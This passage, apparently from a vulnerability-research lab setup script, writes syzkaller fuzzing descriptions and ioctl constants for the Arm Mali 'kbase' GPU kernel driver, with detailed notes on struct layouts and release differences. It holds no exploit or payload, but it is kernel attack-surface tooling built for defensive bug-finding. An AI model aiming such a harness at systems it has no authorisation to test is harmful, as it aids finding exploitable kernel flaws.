base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_12__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt" "18f6fa688bb6e0c6aebb0a248e2dd1844024c10f4832d28584d13f412b0764b0"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt.const" <<'__PL_13__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64
AT_FDCWD = amd64:18446744073709551516
BASEP_MEM_INVALID_HANDLE = amd64:0
BASEP_MEM_NO_USER_FREE = amd64:128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = amd64:32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = amd64:16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = amd64:2
BASE_JD_DEP_TYPE_DATA = amd64:1
BASE_JD_DEP_TYPE_INVALID = amd64:0
BASE_JD_DEP_TYPE_ORDER = amd64:2
BASE_JD_PRIO_HIGH = amd64:1
BASE_JD_PRIO_LOW = amd64:2
BASE_JD_PRIO_MEDIUM = amd64:0
BASE_JD_REQ_CF = amd64:8
BASE_JD_REQ_COHERENT_GROUP = amd64:64
BASE_JD_REQ_CS = amd64:2
BASE_JD_REQ_DEP = amd64:0
BASE_JD_REQ_END_RENDERPASS = amd64:524288
BASE_JD_REQ_EVENT_COALESCE = amd64:32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = amd64:4096
BASE_JD_REQ_EXTERNAL_RESOURCES = amd64:256
BASE_JD_REQ_FS = amd64:1
BASE_JD_REQ_FS_AFBC = amd64:8192
BASE_JD_REQ_JOB_SLOT = amd64:131072
BASE_JD_REQ_ONLY_COMPUTE = amd64:1024
BASE_JD_REQ_PERMON = amd64:128
BASE_JD_REQ_SKIP_CACHE_END = amd64:65536
BASE_JD_REQ_SKIP_CACHE_START = amd64:32768
BASE_JD_REQ_SOFT_JOB = amd64:512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = amd64:2048
BASE_JD_REQ_START_RENDERPASS = amd64:262144
BASE_JD_REQ_T = amd64:4
BASE_JD_REQ_V = amd64:16
BASE_MEM_CACHED_CPU = amd64:4096
BASE_MEM_COHERENT_LOCAL = amd64:2048
BASE_MEM_COHERENT_SYSTEM = amd64:1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = amd64:32768
BASE_MEM_DONT_NEED = amd64:131072
BASE_MEM_FLAG_MAP_FIXED = amd64:134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = amd64:64
BASE_MEM_GROW_ON_GPF = amd64:512
BASE_MEM_IMPORT_SHARED = amd64:262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = amd64:67108864
BASE_MEM_IMPORT_TYPE_INVALID = amd64:0
BASE_MEM_IMPORT_TYPE_UMM = amd64:2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = amd64:3
BASE_MEM_NEED_MMAP = amd64:16384
BASE_MEM_PROTECTED = amd64:65536
BASE_MEM_PROT_CPU_RD = amd64:1
BASE_MEM_PROT_CPU_WR = amd64:2
BASE_MEM_PROT_GPU_EX = amd64:16
BASE_MEM_PROT_GPU_RD = amd64:4
BASE_MEM_PROT_GPU_WR = amd64:8
BASE_MEM_RESERVED_BIT_19 = amd64:524288
BASE_MEM_RESERVED_BIT_8 = amd64:256
BASE_MEM_SAME_VA = amd64:8192
BASE_MEM_TILER_ALIGN_TOP = amd64:1048576
BASE_MEM_UNCACHED_GPU = amd64:2097152
BASE_SYNCSET_OP_CSYNC = amd64:2
BASE_SYNCSET_OP_MSYNC = amd64:1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = amd64:4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = amd64:1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = amd64:1
BASE_TIMEINFO_TIMESTAMP_FLAG = amd64:2
BASE_TIMEINFO_USER_SOURCE_FLAG = amd64:2147483648
KBASE_HWCNT_READER_CLEAR = amd64:1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = amd64:1074052673
KBASE_HWCNT_READER_DUMP = amd64:1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = amd64:1074052672
KBASE_HWCNT_READER_GET_API_VERSION = amd64:1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = amd64:1074315007
KBASE_HWCNT_READER_GET_BUFFER = amd64:2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = amd64:2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = amd64:2149629472
KBASE_HWCNT_READER_GET_HWVER = amd64:2147794432
KBASE_HWCNT_READER_PUT_BUFFER = amd64:1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = amd64:1075887649
KBASE_HWCNT_READER_SET_INTERVAL = amd64:1074052656
KBASE_IOCTL_DISJOINT_QUERY = amd64:2147778572
KBASE_IOCTL_FENCE_VALIDATE = amd64:1074036761
KBASE_IOCTL_GET_CONTEXT_ID = amd64:2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = amd64:3223355442
KBASE_IOCTL_GET_DDK_VERSION = amd64:1074823181
KBASE_IOCTL_GET_GPUPROPS = amd64:1074823171
KBASE_IOCTL_HWCNT_CLEAR = amd64:32779
KBASE_IOCTL_HWCNT_DUMP = amd64:32778
KBASE_IOCTL_HWCNT_ENABLE = amd64:1075347465
KBASE_IOCTL_HWCNT_READER_SETUP = amd64:1075085320
KBASE_IOCTL_HWCNT_SET = amd64:1074823200
KBASE_IOCTL_JOB_SUBMIT = amd64:1074823170
KBASE_IOCTL_MEM_ALIAS = amd64:3223355413
KBASE_IOCTL_MEM_ALLOC = amd64:3223355397
KBASE_IOCTL_MEM_COMMIT = amd64:1074823188
KBASE_IOCTL_MEM_EXEC_INIT = amd64:1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = amd64:3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = amd64:3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = amd64:1075347479
KBASE_IOCTL_MEM_FREE = amd64:1074298887
KBASE_IOCTL_MEM_IMPORT = amd64:3222831126
KBASE_IOCTL_MEM_JIT_INIT = amd64:1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = amd64:1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = amd64:1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = amd64:1074823195
KBASE_IOCTL_MEM_QUERY = amd64:3222306822
KBASE_IOCTL_MEM_SYNC = amd64:1075871759
KBASE_IOCTL_POST_TERM = amd64:32772
KBASE_IOCTL_SET_FLAGS = amd64:1074036737
KBASE_IOCTL_SOFT_EVENT_UPDATE = amd64:1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = amd64:1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = amd64:1074823198
KBASE_IOCTL_STREAM_CREATE = amd64:1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = amd64:1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = amd64:32787
KBASE_IOCTL_VERSION_CHECK = amd64:3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = amd64:3221520436
KBASE_MEM_QUERY_COMMIT_SIZE = amd64:1
KBASE_MEM_QUERY_FLAGS = amd64:3
KBASE_MEM_QUERY_VA_SIZE = amd64:2
__NR_ioctl = amd64:16
__NR_mmap = amd64:9
__NR_munmap = amd64:11
__NR_openat = amd64:257
__PL_13__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r28p0.txt.const" "3b782af08be521b4f89f40f6d52ab9392d1c5108833b54e264ac5416749d7361"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/refs/dev_mali_r41p0.txt" <<'__PL_14__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r41p0-01eac0 (UAPI UK 11.36, POST the CVE-2021-28663
# fix), JOB MANAGER mode (MALI_USE_CSF == 0) exactly as built into this lab's
# 4.19.320 NO_MALI kernel (builds/linux-4.19.320-r41p0, banner r41p0-01eac0).
#
# Provenance & verification (full detail in evidence/06_fuzzing.md):
# - Base layer adapted from upstream sys/linux/dev_bifrost.txt (ChromeOS-4.19
#   bifrost, JM-era) and cross-checked field-by-field against this release's
#   pristine uapi headers under harness/release_uapi/r41p0-01eac0 (hashes in
#   MANIFEST.md). The r56p0 CSF overlay (upstream dev_mali.txt) is NOT used:
#   our kernel dispatches the JM ioctl branch only.
# - Layout drift fixed vs dev_bifrost.txt (verified by _Static_assert gate in
#   harness/release_uapi/r41p0-01eac0/layout_check_r41p0.c):
#   * base_jd_atom_v2: @34 is jit_id[2] (u8) in r41p0 — bifrost desc modeled
#     the older compat_core_req(u16) name there (same 2 bytes, 56B total).
#   * kbase_hwcnt_reader_metadata: r41p0 appends `cycles` (16B) -> 32B total
#     (ChromeOS-era was 16B; the HWCNT_READER_* cmd sizes shift with it).
#   * kbase_ioctl_get_cpu_gpu_timeinfo: in.paddings is __u32[7] (28B) in
#     r41p0, not u8[7]; total in-view 32B.
#   * kbase_ioctl_mem_jit_init: r41p0 has the 24B form with trailing
#     phys_pages (already matched by bifrost desc; the 10.2/11.5 legacy
#     structs are gone — removed in UK 11.36).
# - Dropped (NOT part of r41p0): MEM_JIT_INIT_10_2 / MEM_JIT_INIT_11_5
#   (removed UK 11.36), legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (removed
#   UK 11.33). GET_PROFILING_CONTROLS does not exist in r41p0 headers.
# - Added (r41p0 JM ioctls absent from dev_bifrost.txt): VERSION_CHECK
#   _RESERVED(52), KINSTR_JM_FD(51), KINSTR_PRFCNT_SETUP(53),
#   CONTEXT_PRIORITY_CHECK(54), SET_LIMITED_CORE_COUNT(55),
#   KINSTR_PRFCNT_ENUM_INFO(56).
# - Excluded as unreachable in THIS kernel config (documented, not silently):
#   CINSTR_GWT_START/STOP/DUMP (needs CONFIG_MALI_CINSTR_GWT, unset),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST only),
#   CS_* queue/fault ioctls + MEM_ALLOC_EX + READ_USER_PAGE (MALI_USE_CSF).
#
# Union-style ioctl structs: kbase passes in/out views of one buffer. Fields
# that alias the kernel's out-view slot are typed as the out value and marked
# (inout), e.g. MEM_ALLOC@8 = commit_pages(in)/gpu_va(out); the executor then
# copyouts the kernel-returned GPU VA into the gpu_addr resource, enabling
# alloc -> use -> free chaining while keeping the modeled size == the exact
# release _IOC_SIZE. See evidence/06 for the offset mapping table.
#
# Consts in dev_mali_r41p0.txt.const were extracted from the r41p0 headers:
#   bin/syz-extract -arch amd64 -sourcedir/-builddir builds/linux-4.19.320-r41p0 \
#       -includedirs harness/release_uapi/r41p0-01eac0 dev_mali_r41p0.txt
# and cross-checked against a C dumper compiled from the same headers.
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/mali_base_common_kernel.h>
include <gpu/arm/midgard/jm/mali_base_jm_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_JM_FD(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_JM_FD], arg ptr[in, kbase_kinstr_jm_fd])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_kinstr_jm_fd {
	count	int16
	padding	array[const[0, int8], 6]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
